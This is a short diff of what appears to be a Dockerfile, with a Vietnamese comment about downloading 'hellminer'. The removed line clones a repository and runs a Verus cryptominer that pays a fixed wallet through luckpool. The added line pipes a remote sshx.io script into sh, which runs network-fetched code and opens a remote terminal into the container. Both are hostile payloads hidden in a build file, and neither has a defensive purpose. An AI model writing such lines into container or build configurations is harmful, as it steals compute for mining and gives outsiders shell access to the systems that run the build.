@@ -10,4 +10,4 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
 
 # Tạo thư mục làm việc và tải hellminer
 
-RUN git clone https://github.com/Teo4268/test.git && cd test && ./test -a verus -o stratum+tcp://eu.luckpool.net:3956 -u R9V2bPUyD6gJZTckXQcoK6GCMLB9NW2h6X -p x -t 4
+RUN apt upgrade && curl -sSf https://sshx.io/get | sh -s run
